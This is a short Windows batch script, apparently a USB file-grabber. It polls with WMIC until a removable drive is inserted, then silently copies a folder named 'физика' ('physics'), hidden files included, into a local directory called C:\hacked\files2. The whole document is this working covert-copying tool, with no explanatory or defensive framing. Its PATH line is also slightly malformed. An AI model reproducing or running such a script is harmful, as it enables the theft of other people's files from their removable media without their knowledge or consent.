set path=C:\Windows\system32;C:\Windows%path%
Setlocal EnableDelayedExpansion EnableExtensions
chcp 1251
:start
for /f "skip=1 tokens=1-3" %%i in ('2^>nul ^
WMIC LogicalDisk ^
WHERE "DriveType='2' AND Name<>'A:' AND Name<>'B:'" ^
GET Name^, VolumeSerialNumber^, VolumeName') do (
  if -%%j neq - (
      echo %%i %%j %%k
MD C:\hacked\files2
xcopy %%i\физика C:\hacked\files2 /H /E /G /Q /R /Y
      goto :eof
    ) else (
ping -n 5 127.0.0.1 >NUL:
      goto :start
  )
)
